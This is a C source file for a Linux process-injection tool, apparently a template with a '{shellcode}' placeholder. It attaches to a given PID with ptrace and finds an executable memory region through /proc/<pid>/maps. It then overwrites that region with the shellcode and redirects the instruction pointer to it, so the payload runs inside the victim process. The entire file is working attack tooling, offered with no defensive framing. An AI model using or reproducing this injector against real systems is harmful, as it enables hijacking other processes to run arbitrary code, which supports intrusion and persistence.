#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>
#include <stdint.h>

const char *SHELLCODE = "{shellcode}";

void inject(pid_t pid) {
    struct user_regs_struct old_regs, regs;
    long address;
    size_t psize = strlen(SHELLCODE);

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("Failed to attach to process.");
        exit(EXIT_FAILURE);
    }

    wait(NULL);

    if (ptrace(PTRACE_GETREGS, pid, NULL, &old_regs) < 0) {
        perror("Failed to get state from registers.");
        exit(EXIT_FAILURE);
    }

    char maps[20];
    snprintf(maps, sizeof(maps), "/proc/%d/maps", pid);
    FILE *file_maps = fopen(maps, "r");
    if (!file_maps) {
        perror("Failed to open maps file.");
        exit(EXIT_FAILURE);
    }

    char line[256];
    while (fgets(line, sizeof(line), file_maps)) {
        if (strstr(line, "r-xp") != NULL) {
            address = strtol(strtok(line, "-"), NULL, 16);
            break;
        }
    }
    fclose(file_maps);

    if (address == 0) {
        fprintf(stderr, "Failed to find a suitable memory region for injection.\n");
        exit(EXIT_FAILURE);
    }

    for (size_t i = 0; i < psize; i += sizeof(uint64_t)) {
        uint64_t value = *(uint64_t *)(SHELLCODE + i);
        if (ptrace(PTRACE_POKEDATA, pid, address + i, (void *)value) < 0) {
            perror("Failed to write data to process memory.");
            exit(EXIT_FAILURE);
        }
    }

    memcpy(&regs, &old_regs, sizeof(struct user_regs_struct));
    regs.rip = address;

    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        perror("Failed to set registers state.");
        exit(EXIT_FAILURE);
    }

    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
        perror("Failed to detach from process.");
        exit(EXIT_FAILURE);
    }

    printf("[*] SUCCESSFULLY! Injected!! [*]\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Use: %s <pid>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);
    inject(pid);

    return 0;
}